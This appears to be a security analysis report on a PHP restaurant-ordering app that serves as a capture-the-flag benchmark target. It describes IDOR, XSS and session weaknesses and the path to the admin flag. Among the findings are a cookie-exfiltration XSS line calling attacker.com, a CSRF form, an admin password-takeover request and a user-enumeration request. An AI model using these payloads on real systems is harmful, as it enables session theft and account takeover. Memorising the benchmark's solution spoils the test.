# Penetration Test Scope & Boundaries

**Primary Directive:** This analysis is strictly limited to the **network-accessible attack surface** of the application. All subsequent tasks must adhere to this scope. Before reporting any finding (e.g., an entry point, a vulnerability sink), it has been verified to meet the "In-Scope" criteria.

### In-Scope: Network-Reachable Components
A component is considered **in-scope** if its execution can be initiated, directly or indirectly, by a network request that the deployed application server is capable of receiving. This includes:
- Publicly exposed web pages and API endpoints
- Endpoints requiring authentication via the application's standard login mechanisms
- Any developer utility, debug console, or script that has been mistakenly exposed through a route or is otherwise callable from other in-scope, network-reachable code

### Out-of-Scope: Locally Executable Only
A component is **out-of-scope** if it **cannot** be invoked through the running application's network interface and requires an execution context completely external to the application's request-response cycle. This includes tools that must be run via:
- A command-line interface (e.g., `go run ./cmd/...`, `python scripts/...`)
- A development environment's internal tooling (e.g., a "run script" button in an IDE)
- CI/CD pipeline scripts or build tools (e.g., Dagger build definitions)
- Database migration scripts, backup tools, or maintenance utilities
- Local development servers, test harnesses, or debugging utilities
- Static files or scripts that require manual opening in a browser (not served by the application)

---

## 1. Executive Summary

This PHP-based food ordering web application presents a **CRITICAL security risk** despite implementing some foundational security controls. The application runs on a traditional LAMP stack (Linux/Apache/MySQL/PHP 7.4) deployed as a single Docker container exposing HTTP port 80. While the codebase demonstrates proper SQL injection protection through consistent use of PDO prepared statements and employs bcrypt password hashing, it suffers from **seven critical vulnerabilities** that enable complete application compromise.

The most severe findings include two **Insecure Direct Object Reference (IDOR)** vulnerabilities that allow any authenticated user to change arbitrary users' passwords and access other users' data, two **DOM-based Cross-Site Scripting (XSS)** vulnerabilities enabling session hijacking and credential theft, **complete absence of HTTPS/TLS encryption** exposing all traffic including passwords in plaintext, **hardcoded database credentials** committed to version control, and **missing session security controls** including HttpOnly/Secure flags and CSRF protection. These vulnerabilities create a direct path to CTF flag capture: an attacker can exploit the password change IDOR to compromise the admin account (user ID 7) and retrieve the flag from the profile page.

The application's attack surface consists of 10 network-accessible entry points across 5 PHP pages and 5 REST API endpoints. Authorization controls are fundamentally broken, with API endpoints accepting user IDs from client input rather than enforcing session-based access control. The lack of transport layer security, combined with weak session management (no session regeneration, no CSRF tokens, no cookie security flags), creates multiple privilege escalation paths. Immediate remediation of the IDOR vulnerabilities, implementation of HTTPS, removal of hardcoded secrets from version control, and comprehensive authorization enforcement are required before any production deployment.

---

## 2. Architecture & Technology Stack

### Framework & Language

This application is built on **PHP 7.4** running on **Apache 2.4.41** web server (Ubuntu 20.04 base). The backend uses **native PHP** without any MVC framework such as Laravel, Symfony, or CodeIgniter, relying instead on a traditional procedural PHP architecture with manual routing through individual PHP files. The database layer implements **PDO (PHP Data Objects)** with MySQL driver for data persistence, configured with critical security settings including `PDO::ATTR_EMULATE_PREPARES => false` to enforce true prepared statements at the database level rather than client-side emulation.

From a security perspective, the absence of a modern PHP framework means the application lacks built-in protections typically provided by frameworks such as automatic CSRF token generation, input validation middleware, security header configuration, and ORM-based query protection. Every security control must be manually implemented, creating opportunities for oversight. The application does leverage PHP's native security functions including `password_hash()` with PASSWORD_BCRYPT, `password_verify()`, `htmlspecialchars()` for output encoding, and prepared statements for SQL injection prevention. However, these are inconsistently applied across the codebase—for example, `htmlspecialchars()` is used only in profile.php while other outputs remain vulnerable to XSS.

The frontend stack consists of **Bootstrap 5.3.3** and **jQuery 3.6.0**, both loaded from CDNs. This client-side architecture creates security implications: all AJAX requests are manually constructed without framework-level XSS protection, DOM manipulation frequently uses unsafe string concatenation rather than jQuery's safe DOM builder methods, and there is no Content Security Policy to restrict inline script execution. The application's reliance on jQuery's `.append()` method with HTML string concatenation is the root cause of the identified XSS vulnerabilities.

### Architectural Pattern

The application follows a **monolithic single-container architecture**, representing a traditional LAMP stack deployment pattern. Both the **MySQL 8.0.37 database** and **Apache web server** run within the same Docker container, managed by **supervisord** as the process supervisor. This architectural decision violates modern microservices principles and creates significant security implications.

From a trust boundary perspective, this architecture collapses multiple security layers into a single attack surface. If the web application is compromised through any of the identified vulnerabilities (IDOR, XSS, or session hijacking), the attacker immediately gains access to the database server running on localhost (127.0.0.1). There is no network segmentation between the application tier and data tier, no separate database server with firewall rules, and no ability to isolate database access through network-level controls. The database connection uses localhost networking, making it impossible to implement network-based access controls or monitor database traffic through network security tools.

The container architecture defined in `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-069-24/docker-compose.yml` exposes only port 80 (HTTP) to the host system, with no HTTPS termination at any layer. The Dockerfile at `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-069-24/app/Dockerfile` builds from `ubuntu:20.04` and installs both apache2 and mysql-server, then configures supervisord to manage both processes. This creates operational security risks: if either process crashes or is compromised, the entire application becomes unavailable, and container-level resource limits apply to both services collectively rather than independently.

The supervisord configuration at `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-069-24/app/supervisord.conf` runs Apache in foreground mode and MySQL via mysqld_safe, with logs written to `/var/log/apache2/` inside the container. This logging configuration means security events are ephemeral unless Docker log collection is configured externally. The Dockerfile also includes a critical security anti-pattern at line 22: `RUN chmod 777 /var/run/mysqld`, granting world-writable permissions to the MySQL socket directory, allowing any process in the container to potentially interact with the database.

### Critical Security Components

**Authentication System (`/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-069-24/app/website/api/login.php`):** The application implements session-based authentication using PHP's native session mechanism. Upon successful login, the user's ID is stored in `$_SESSION['user_id']` (line 17), which becomes the sole indicator of authentication status throughout the application. The login flow accepts username and password via POST parameters (lines 8-9), queries the database using a prepared statement (lines 12-14), and verifies the password using `password_verify()` against the bcrypt hash (line 16). However, critical security controls are missing: there is **no session regeneration** via `session_regenerate_id(true)` after authentication, creating a session fixation vulnerability; there is **no rate limiting**, allowing unlimited brute force attempts; there is **no CAPTCHA** or account lockout mechanism; and there is **no CSRF protection** on the login form itself.

**Password Security (`/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-069-24/app/website/api/register.php`):** Passwords are hashed using PHP's `password_hash()` function with PASSWORD_BCRYPT algorithm (line 9), which automatically generates salts and uses bcrypt's blowfish algorithm with a cost factor of 10 (the PHP default). This is cryptographically sound for password storage, and password verification in login.php uses `password_verify()` (line 16) rather than comparing hashes directly, properly leveraging bcrypt's timing-safe comparison. The database seed data in `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-069-24/app/init.sql` contains 12 pre-hashed passwords including the admin account (line 62), demonstrating consistent use of bcrypt. However, the registration endpoint enforces **no password complexity requirements**, accepting any password length or character set, and there is no minimum password length validation beyond database constraints.

**Database Security (`/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-069-24/app/website/include/config.php`):** The application consistently uses PDO prepared statements with parameter binding across all five API endpoints (login.php lines 12-13, register.php lines 12-13, search_restaurants.php lines 12-15, get_favorite_restaurants.php lines 17-24, change_password.php lines 25-31). The PDO configuration includes critical security settings: `PDO::ATTR_EMULATE_PREPARES => false` ensures true prepared statements are executed at the MySQL level rather than emulated client-side, and `PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION` enables exception-based error handling. This configuration effectively prevents SQL injection attacks. However, the database credentials are **hardcoded in source code** (line 6: `$pass = "P@ssw0rd123!"`), the web application user has **ALL PRIVILEGES** on the database (init.sql lines 19-21) violating the principle of least privilege, and database errors are exposed to users in some endpoints (search_restaurants.php line 19), potentially leaking schema information.

**Session Management:** Sessions are initialized using PHP's native `session_start()` function across six files (login.php:3, profile.php:3, index.php:3, logout.php:2, change_password.php:3, get_favorite_restaurants.php:3), storing only the `user_id` in session data. However, **no session configuration** is present anywhere in the codebase—there are no calls to `ini_set()` for session parameters, no `session_set_cookie_params()`, no php.ini customization, and no `.htaccess` directives. This means the application relies entirely on PHP's default session settings, which are insecure: `session.cookie_httponly = 0` (JavaScript can access session cookies via `document.cookie`, enabling XSS-based session hijacking), `session.cookie_secure = 0` (session cookies transmitted over HTTP even if HTTPS were available), `session.cookie_samesite = ""` (no CSRF protection at cookie level), and `session.use_strict_mode = 0` (session fixation attacks possible). The logout implementation at `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-069-24/app/website/logout.php` calls `session_destroy()` (line 3) but fails to call `session_unset()` first and does not explicitly delete the session cookie from the browser.

**Authorization Controls:** The application implements role-based access control through a `role` column in the users table (init.sql line 40), with two roles defined: 'visitor' (default) and 'ADMIN'. The admin flag is displayed only when `$user['role'] === 'ADMIN'` (profile.php line 123), restricting flag visibility to the admin account (user ID 7, username 'admin'). However, authorization enforcement is **fundamentally broken** in two critical API endpoints: `/api/change_password.php` accepts `userId` from the POST body (line 31) rather than using `$_SESSION['user_id']`, allowing any authenticated user to change any other user's password including the admin's password; and `/api/get_favorite_restaurants.php` accepts `userId` from the GET parameter (line 14) without verifying it matches the session user, allowing any authenticated user to view any other user's favorite restaurants. These Insecure Direct Object Reference (IDOR) vulnerabilities completely bypass the intended authorization model.

---

## 3. Authentication & Authorization Deep Dive

### Authentication Mechanisms and Their Security Properties

The application employs **session-based authentication** using PHP's native session mechanism, implemented across three primary endpoints that manage the complete authentication lifecycle. The authentication flow begins with the login endpoint at `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-069-24/app/website/api/login.php`, which accepts POST requests with username and password parameters. On line 3, `session_start()` initializes or resumes the PHP session, then lines 8-9 extract credentials directly from `$_POST` superglobals without any input validation or sanitization. The database query uses a prepared statement (lines 12-14) to fetch the user record by username, followed by password verification using `password_verify($password, $user['password'])` on line 16, which performs constant-time comparison of the provided password against the bcrypt hash stored in the database.

Upon successful authentication, the endpoint sets `$_SESSION['user_id'] = $user['id']` on line 17, establishing the authenticated session. This single session variable becomes the sole trust indicator throughout the application—its presence signifies authentication, and its value determines which user's data should be accessed. However, **critical security controls are absent**: there is no call to `session_regenerate_id(true)` after authentication, creating a **session fixation vulnerability** where an attacker can pre-set a session ID, trick a victim into authenticating with that session, and then hijack the authenticated session; there is no rate limiting mechanism on the login endpoint, allowing unlimited brute force attempts against user accounts; there is no CAPTCHA or challenge-response system to prevent automated attacks; and there is no account lockout mechanism after failed login attempts.

The registration endpoint at `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-069-24/app/website/api/register.php` creates new user accounts without requiring email verification or any form of identity validation. Lines 7-8 accept username and email directly from POST parameters without format validation, length restrictions, or character filtering. Line 9 hashes the password using `password_hash($_POST['password'], PASSWORD_BCRYPT)`, which generates a bcrypt hash with automatic salt generation and a cost factor of 10. The INSERT statement (lines 12-13) uses prepared statements to prevent SQL injection, and the database schema enforces UNIQUE constraints on username and email columns, preventing duplicate accounts. However, the endpoint **enforces no password complexity requirements**—users can register with single-character passwords, numeric-only passwords, or dictionary words. Additionally, newly registered accounts are immediately active without email verification, enabling mass account creation for spam or abuse.

**Complete list of authentication API endpoints:**
1. **`/api/login.php`** (POST) - Lines 7-21 - Authenticates user with username/password, creates session with `user_id`
2. **`/api/register.php`** (POST) - Lines 6-17 - Creates new user account with bcrypt password hashing
3. **`/api/change_password.php`** (POST) - Lines 12-38 - Changes user password (requires authentication) - **CRITICAL IDOR VULNERABILITY**
4. **`/logout.php`** (GET) - Lines 2-5 - Destroys session and redirects to login page

**Missing authentication endpoints** that would be expected in a production application include: password reset/recovery flows (no "forgot password" functionality), email verification endpoints (accounts are active immediately), multi-factor authentication endpoints (no 2FA/MFA support), token refresh endpoints (no JWT or token-based auth), and OAuth/SSO integration endpoints.

### Session Management and Token Security

Session cookies in this application are configured **entirely by PHP defaults** due to the complete absence of explicit session configuration. Extensive code analysis across all PHP files revealed no calls to `session_set_cookie_params()`, no `ini_set()` calls for session directives, no php.ini customization, and no Apache `.htaccess` directives related to session management. This default configuration creates **multiple critical vulnerabilities** in session cookie security.

**Session cookie flags configuration - CRITICAL FINDING:** The exact file and line numbers where session cookie flags should be configured **do not exist** in this codebase. The expected configuration location would be immediately before the first `session_start()` call in each entry point (login.php:3, profile.php:3, etc.), but these configurations are absent. The default PHP 7.4 session cookie configuration is:

- **HttpOnly flag: DISABLED** (`session.cookie_httponly = 0`) - This is the most severe cookie security vulnerability. Without the HttpOnly flag, JavaScript code can access the session cookie via `document.cookie`. Combined with the two identified XSS vulnerabilities in index.php (lines 254-264) and profile.php (lines 183-190), an attacker can execute `<script>fetch('https://attacker.com/steal?cookie=' + document.cookie)</script>` to exfiltrate the session ID and hijack user sessions remotely.

- **Secure flag: DISABLED** (`session.cookie_secure = 0`) - Without the Secure flag, session cookies are transmitted over both HTTP and HTTPS connections. Since this application exposes only HTTP port 80 (docker-compose.yml:8) with no HTTPS configuration, all session cookies are transmitted in cleartext over the network, vulnerable to man-in-the-middle attacks. Any network observer (malicious WiFi hotspot, compromised router, ISP interception) can capture session IDs and impersonate users.

- **SameSite attribute: NOT SET** (`session.cookie_samesite = ""`) - Without the SameSite attribute set to 'Strict' or 'Lax', session cookies are sent with cross-site requests, enabling Cross-Site Request Forgery (CSRF) attacks. Combined with the complete absence of CSRF tokens on all forms, an attacker can craft malicious pages that trigger authenticated requests: `<form action="http://victim-app.com/api/change_password.php" method="POST"><input name="userId" value="7"><input name="oldPassword" value="attacker-known"><input name="newPassword" value="attacker-controlled"></form>`.

**Expected secure configuration (NOT PRESENT):**
```php
// This code DOES NOT EXIST in the application
ini_set('session.cookie_httponly', 1);
ini_set('session.cookie_secure', 1);
ini_set('session.cookie_samesite', 'Strict');
ini_set('session.use_strict_mode', 1);
session_start();
```

Session timeout and expiration mechanisms are **not configured** anywhere in the application. PHP's default `session.gc_maxlifetime` is 1440 seconds (24 minutes), but this applies only to session file garbage collection, not to idle timeout enforcement. The application implements no application-level session timeout checks, no "last activity" timestamp validation, and no absolute session duration limits. A user who logs in once can maintain an active session indefinitely by periodically making requests, and there is no forced re-authentication even for sensitive operations like password changes.

### Authorization Model and Potential Bypass Scenarios

The application's authorization model is based on a `role` field in the users database table (init.sql line 40: `role varchar(50) NULL DEFAULT 'visitor'`), with two roles currently in use: 'visitor' (the default role for all newly registered users and most seeded accounts) and 'ADMIN' (assigned only to user ID 7, username 'admin', email 'admin@foodapp.local'). However, the authorization model is **critically broken** with two severe Insecure Direct Object Reference (IDOR) vulnerabilities that allow complete authorization bypass.

**CRITICAL VULNERABILITY #1: Password Change IDOR** (`/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-069-24/app/website/api/change_password.php`)

This endpoint demonstrates a **fundamental authorization flaw** where authentication checks and authorization enforcement operate on different user IDs:

- **Line 7-10:** Authentication check confirms user is logged in by verifying `$_SESSION['user_id']` exists
- **Line 13-15:** Accepts `oldPassword`, `newPassword`, `confirmPassword`, and **`userId`** from POST body
- **Line 25-27:** Fetches the current password for validation using `$_SESSION['user_id']` (the logged-in user)
- **Line 29:** Verifies the provided `oldPassword` matches the logged-in user's current password
- **Line 31:** **CRITICAL BUG** - Updates password using `$_POST['userId']` instead of `$_SESSION['user_id']`

The vulnerability is in this logic flow: the endpoint verifies that the authenticated user knows their own current password, but then changes the password for whatever user ID is specified in the POST body. An attacker can exploit this with the following attack:

```http
POST /api/change_password.php HTTP/1.1
Cookie: PHPSESSID=attacker-session-id
Content-Type: application/x-www-form-urlencoded

oldPassword=attacker-current-password&newPassword=attacker-chosen-password&confirmPassword=attacker-chosen-password&userId=7
```

This request will:
1. Verify the attacker's current password (passes because attacker knows their own password)
2. Change user ID 7's (admin) password to the attacker-controlled value
3. Allow attacker to login as admin with the new password
4. Grant access to the admin flag on profile.php (line 125)

This is a **horizontal privilege escalation** vulnerability that allows any authenticated user to change any other user's password, including the admin account, achieving complete account takeover of all users in the system.

**CRITICAL VULNERABILITY #2: Favorites Data IDOR** (`/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-069-24/app/website/api/get_favorite_restaurants.php`)

This endpoint implements authentication but **no authorization**, allowing authenticated users to access any other user's data:

- **Line 7-10:** Verifies user is authenticated via `$_SESSION['user_id']`
- **Line 14:** Accepts `userId` from GET parameter: `$userId = $_GET['userId'];`
- **Lines 17-24:** Queries database for favorites belonging to the specified `userId`
- **MISSING:** No validation that `$_GET['userId']` matches `$_SESSION['user_id']`

An attacker can enumerate all users' favorite restaurants by iterating through user IDs:

```http
GET /api/get_favorite_restaurants.php?userId=1 HTTP/1.1  # Returns user 1's favorites
GET /api/get_favorite_restaurants.php?userId=2 HTTP/1.1  # Returns user 2's favorites
GET /api/get_favorite_restaurants.php?userId=7 HTTP/1.1  # Returns admin's favorites
```

This horizontal privilege escalation allows any authenticated user to view any other user's private data, violating data confidentiality and privacy requirements.

**Authorization Bypass Scenarios:**

1. **CTF Flag Capture Path:** Register account → Login → Exploit password change IDOR with userId=7 → Login as admin → View flag on profile.php
2. **Mass Data Exfiltration:** Authenticate once → Enumerate all userId values (1-N) → Extract all users' favorite restaurants
3. **Account Takeover Chain:** Change victim's password via IDOR → Login as victim → Access victim's session and data → Change another user's password
4. **Role Escalation (Potential):** If SQL injection existed (none found), could execute `UPDATE users SET role='ADMIN' WHERE id=<attacker-id>`, but IDOR provides easier path

### Multi-tenancy Security Implementation

This application does **not implement multi-tenancy** in the traditional sense of separate customer/tenant databases or schemas. However, it does implement **user data isolation** (each user should only access their own data), which is fundamentally broken by the IDOR vulnerabilities described above. The database schema uses foreign key relationships (favorite_restaurants.user_id references users.id) to associate data with users, but the application layer fails to enforce that authenticated users can only access resources belonging to their session user_id.

### SSO/OAuth/OIDC Flows

**NOT IMPLEMENTED.** The application contains no OAuth 2.0, OpenID Connect, SAML, or other Single Sign-On integration. Comprehensive code analysis found:

- **No OAuth callback endpoints** - No redirect URI handlers for OAuth flows
- **No state parameter validation** - Not applicable, no OAuth implementation
- **No nonce parameter validation** - Not applicable, no OIDC implementation
- **No JWKS fetching** - No JSON Web Key Set retrieval for token validation
- **No third-party authentication** - Application supports only username/password authentication

All authentication is handled internally using PHP sessions and bcrypt password hashing. There are no external identity providers, no federated authentication, and no social login options.

---

## 4. Data Security & Storage

### Database Security

The application uses **MySQL 8.0.37** as its relational database management system, running within the same Docker container as the Apache web server (violating security best practices for network segmentation). The database is initialized via `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-069-24/app/init.sql`, which creates the database schema, a dedicated web application database user, and seeds the database with 12 user accounts and 140 restaurant records.

**Access Controls and Privilege Separation:** The database configuration demonstrates a **critical violation of the principle of least privilege**. Lines 19-21 of init.sql create the web application database user with excessive permissions:

```sql
CREATE USER 'web_db_user'@'localhost' IDENTIFIED BY 'P@ssw0rd123!';
GRANT ALL PRIVILEGES ON app_db.* TO 'web_db_user'@'localhost';
FLUSH PRIVILEGES;
```

The `ALL PRIVILEGES` grant includes dangerous capabilities that a web application should never possess: `DROP` (can destroy tables), `CREATE` (can create new tables), `ALTER` (can modify schema), `GRANT OPTION` (can grant permissions to others), `RELOAD`, `SHUTDOWN`, and administrative functions. If the application is compromised through any of the identified vulnerabilities (XSS, IDOR, session hijacking), the attacker inherits these excessive database privileges and can completely destroy the database, exfiltrate all data, or persist backdoors in the schema. The **recommended configuration** would restrict privileges to only: `SELECT`, `INSERT`, `UPDATE`, `DELETE` on specific tables needed by the application.

**Query Safety and SQL Injection Protection:** The application demonstrates **strong protection against SQL injection** through consistent use of PDO prepared statements with parameter binding across all database interactions. The database connection configuration in `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-069-24/app/website/include/config.php` includes critical security settings:

```php
$options = [
    PDO::ATTR_ERRMODE            => PDO::ERRMODE_EXCEPTION,
    PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
    PDO::ATTR_EMULATE_PREPARES   => false,  // Line 12 - Critical security setting
];
```

The `PDO::ATTR_EMULATE_PREPARES => false` directive is particularly important—it forces PDO to use true prepared statements at the MySQL protocol level rather than emulating them client-side through string escaping. True prepared statements ensure that parameter data is sent separately from the SQL query structure, making SQL injection impossible even if escaping functions have vulnerabilities.

All five API endpoints demonstrate proper parameterized query usage:
- **login.php (lines 12-13):** `SELECT * FROM users WHERE username = :username` with `execute(['username' => $username])`
- **register.php (lines 12-13):** `INSERT INTO users (username, email, password) VALUES (:username, :email, :password)`
- **search_restaurants.php (lines 12-15):** `SELECT * FROM restaurants WHERE name LIKE :name_query OR category LIKE :category_query` with `bindParam()`
- **get_favorite_restaurants.php (lines 17-24):** Complex JOIN query with `:user_id` parameter
- **change_password.php (lines 25-26, 30-31):** `SELECT password FROM users WHERE id = :id` and `UPDATE users SET password = :password WHERE id = :id`

**Encryption at Rest:** The database implements **NO encryption at rest**. MySQL 8.0 supports Transparent Data Encryption (TDE) for tablespace encryption, but this application does not enable it. The database files stored at `/var/lib/mysql` inside the Docker container (and potentially on the host filesystem depending on volume configuration) contain all data in plaintext, including bcrypt password hashes, user email addresses, and all restaurant data. If an attacker gains filesystem access (through container escape, host compromise, or backup theft), all database contents are immediately readable. Additionally, database backups would contain unencrypted data unless external backup encryption is applied.

### Data Flow Security

**Sensitive Data Paths:** The application handles three primary categories of sensitive data: authentication credentials (passwords), personally identifiable information (usernames, email addresses), and user-specific data (favorite restaurants). Each has distinct security characteristics across the input → storage → output flow.

**Password Data Flow:**
- **Input:** Passwords arrive via POST parameters to `/api/register.php` and `/api/login.php` (unencrypted due to HTTP-only transport)
- **Processing:** Registration hashes passwords using `password_hash()` with PASSWORD_BCRYPT (register.php line 9); login verifies using `password_verify()` (login.php line 16)
- **Storage:** Bcrypt hashes stored in `users.password` VARCHAR(255) column (init.sql line 41), properly salted and hashed
- **Output:** Passwords are never returned to clients; only authentication success/failure responses
- **Vulnerabilities:** Transmitted in cleartext over HTTP (no TLS), no minimum password strength requirements, weak passwords accepted

**PII Data Flow (Email Addresses):**
- **Input:** Email addresses submitted via POST to `/api/register.php` (line 8: `$email = $_POST['email']`)
- **Validation:** **NONE** - no format validation, regex checking, or verification that input is actually an email
- **Storage:** Stored in plaintext in `users.email` VARCHAR(255) column with UNIQUE constraint
- **Output:** Displayed on profile page with proper encoding (profile.php line 121: `htmlspecialchars($user['email'])`)
- **Vulnerabilities:** Accepted without validation (could store arbitrary strings), stored in plaintext (no encryption), no email verification (no proof user owns the email), transmitted over unencrypted HTTP

**User Data Flow (Favorites):**
- **Input:** Created implicitly through user interactions (data seeded in init.sql, no API endpoint to add favorites found)
- **Storage:** Stored in `favorite_restaurants` table with foreign key to `users.id` (init.sql lines 83-85)
- **Retrieval:** Fetched via `/api/get_favorite_restaurants.php` with **vulnerable userId parameter** (line 14)
- **Output:** Rendered in profile.php via jQuery `.append()` with **XSS vulnerability** (lines 183-190)
- **Vulnerabilities:** IDOR allows unauthorized access (any authenticated user can view any user's favorites), XSS in rendering allows session hijacking

**Data Sanitization:** The application demonstrates **minimal and inconsistent sanitization**. Output encoding via `htmlspecialchars()` is applied in only one file (profile.php lines 120, 121, 125, 176, 215), protecting username, email, flag, and userId from XSS in server-rendered PHP contexts. However, client-side JavaScript rendering in both index.php (lines 254-264) and profile.php (lines 183-190) concatenates database values directly into HTML strings without encoding, creating XSS vulnerabilities. Input validation is **entirely absent**—no length limits (beyond database constraints), no format validation (emails accepted without regex), no character whitelisting, and no content filtering. The application relies solely on prepared statements for SQL injection prevention and bcrypt for password security, but implements no defense-in-depth for other injection vectors.

### Multi-tenant Data Isolation

**NOT APPLICABLE** - This is a single-tenant application serving a single organization/instance. However, the application does implement **user data isolation** (each user should only access their own data), which is **critically broken** by the two IDOR vulnerabilities:

1. **Broken Isolation in `/api/get_favorite_restaurants.php`:** Line 14 accepts `userId` from GET parameter without verifying it matches `$_SESSION['user_id']`, allowing any authenticated user to query any other user's favorites
2. **Broken Isolation in `/api/change_password.php`:** Line 31 uses `$_POST['userId']` in the UPDATE statement instead of `$_SESSION['user_id']`, allowing password changes for arbitrary users

If this application were to be converted to a multi-tenant SaaS model, the current architecture would fail catastrophically. There is no `tenant_id` concept, no row-level security policies, no tenant-scoped queries, and authorization enforcement is non-existent. The IDOR vulnerabilities demonstrate that even single-user data isolation is broken, which would translate to complete multi-tenant data leakage if tenancy were added.

---

## 5. Attack Surface Analysis

### External Entry Points

The application exposes **10 network-accessible entry points** across 5 PHP web pages and 5 REST API endpoints, all accessible via HTTP on port 80. Each represents a potential attack vector with distinct security characteristics:

**PUBLIC WEB PAGES (Unauthenticated Access):**

1. **`/index.php` (GET) - Home Page and Restaurant Search Interface**
   - **File Location:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-069-24/app/website/index.php`
   - **Authentication Required:** No - publicly accessible
   - **Input Parameters:** None (displays featured restaurants and search form)
   - **Security Issues:**
     - **CRITICAL XSS VULNERABILITY:** Lines 254-264 render search results using unsafe jQuery `.append()` with string concatenation: `resultsContainer.append('<h5 class="card-title">' + restaurant.name + '</h5>')`. If the `restaurants` database table contains malicious JavaScript in the `name`, `description`, or `category` fields, it will execute in users' browsers when search results are displayed.
     - **No CSRF protection** on search form (though GET-based search has limited CSRF impact)
     - Client-side AJAX call to `/api/search_restaurants.php` (line 242) exposes search functionality
     - Session-aware (calls `session_start()` on line 3) but does not require authentication
   - **Attack Vectors:** Inject malicious restaurant data into database → Victim searches → XSS payload executes → Session cookie stolen via `document.cookie` (no HttpOnly flag) → Account takeover

2. **`/login.php` (GET) - Login Form Interface**
   - **File Location:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-069-24/app/website/login.php`
   - **Authentication Required:** No - publicly accessible
   - **Purpose:** Displays login form that submits to `/api/login.php` via AJAX (no form code visible in excerpt, but page serves login UI)
   - **Security Issues:** No rate limiting visible at UI layer, no CAPTCHA, form submission handled client-side (vulnerable to credential stuffing scripts)

3. **`/register.php` (GET) - Registration Form Interface**
   - **File Location:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-069-24/app/website/register.php`
   - **Authentication Required:** No - publicly accessible
   - **Purpose:** Displays registration form that submits to `/api/register.php` via AJAX
   - **Security Issues:** No CAPTCHA (mass account creation possible), no email verification required (fake accounts accepted), no rate limiting (automated registration attacks possible)

4. **`/logout.php` (GET) - Session Termination**
   - **File Location:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-069-24/app/website/logout.php`
   - **Authentication Required:** No (but only useful if session exists)
   - **Code:** Lines 2-5: `session_start(); session_destroy(); header('Location: login.php'); exit();`
   - **Security Issues:**
     - **CSRF Vulnerable:** No token required, allowing logout CSRF attacks (`<img src="http://target.com/logout.php">` forces logout)
     - **Incomplete Session Cleanup:** Calls `session_destroy()` but not `session_unset()`, and does not explicitly delete session cookie from browser
     - Acceptable security impact (logout CSRF is low severity)

**AUTHENTICATED WEB PAGES:**

5. **`/profile.php` (GET) - User Profile and FLAG Display**
   - **File Location:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-069-24/app/website/profile.php`
   - **Authentication Required:** YES - Lines 5-8 check `$_SESSION['user_id']` and redirect to login.php if not authenticated
   - **Purpose:** Displays user profile information, favorite restaurants list, and **the CTF flag for ADMIN users**
   - **Security Issues:**
     - **CRITICAL XSS VULNERABILITY:** Lines 183-190 render favorite restaurants using unsafe jQuery `.append()` with HTML string concatenation: `list.append('<li class="list-group-item favorite-restaurant"><img src="' + imageSrc + '" ... alt="' + restaurant + '">' + restaurant + '</li>')`. Malicious restaurant names can break out of the `alt` attribute (`" onerror="alert(1)`) or inject HTML directly.
     - **FLAG DISCLOSURE LOGIC:** Lines 15 and 123-126 display flag if `$user['role'] === 'ADMIN'` (user ID 7). Proper role check implemented, but vulnerable to privilege escalation via IDOR password change.
     - **Client-Side User ID Exposure:** Lines 176 and 215 embed `$user['id']` directly into JavaScript: `url: 'api/get_favorite_restaurants.php?userId=<?php echo htmlspecialchars($user['id']) ?>'` and `userId: '<?php echo htmlspecialchars($user['id']) ?>'`. While properly encoded with `htmlspecialchars()`, this exposes the pattern of passing userId to APIs, hinting at IDOR vulnerabilities.
     - **Password Change Form:** Contains modal form that submits to `/api/change_password.php` without CSRF token
     - **Proper Output Encoding:** Lines 120, 121, 125 correctly use `htmlspecialchars()` for username, email, and flag display

**PUBLIC API ENDPOINTS:**

6. **`/api/login.php` (POST) - Authentication Endpoint**
   - **File Location:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-069-24/app/website/api/login.php`
   - **Authentication Required:** No - this is the authentication endpoint
   - **Input Parameters:**
     - `username` (string) - User's username (line 8)
     - `password` (string) - User's password (line 9)
   - **Security Analysis:**
     - Proper prepared statement prevents SQL injection (lines 12-14)
     - Password verification using `password_verify()` is cryptographically sound (line 16)
     - Sets session on success: `$_SESSION['user_id'] = $user['id']` (line 17)
     - **CRITICAL MISSING:** No `session_regenerate_id(true)` after authentication (session fixation vulnerability)
     - **CRITICAL MISSING:** No rate limiting (unlimited brute force attempts possible)
     - **MISSING:** No account lockout after N failed attempts
     - **MISSING:** No CAPTCHA or challenge-response
     - **MISSING:** No logging of failed authentication attempts
     - Returns JSON: `{'success': true/false, 'message': '...'}`
   - **Attack Vectors:** Brute force password guessing, credential stuffing from breached password databases, session fixation attacks

7. **`/api/register.php` (POST) - User Registration Endpoint**
   - **File Location:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-069-24/app/website/api/register.php`
   - **Authentication Required:** No - public registration
   - **Input Parameters:**
     - `username` (string) - Desired username (line 7)
     - `email` (string) - Email address (line 8)
     - `password` (string) - Password to hash (line 9)
   - **Security Analysis:**
     - Proper bcrypt password hashing: `password_hash($_POST['password'], PASSWORD_BCRYPT)` (line 9)
     - Prepared statement prevents SQL injection (lines 12-13)
     - **CRITICAL MISSING:** No email format validation (accepts any string)
     - **CRITICAL MISSING:** No password complexity requirements (accepts "a" as password)
     - **CRITICAL MISSING:** No username format validation or length limits
     - **CRITICAL MISSING:** No rate limiting (mass account creation possible)
     - **CRITICAL MISSING:** No CAPTCHA (automated bot registration possible)
     - **CRITICAL MISSING:** No email verification (accounts active immediately)
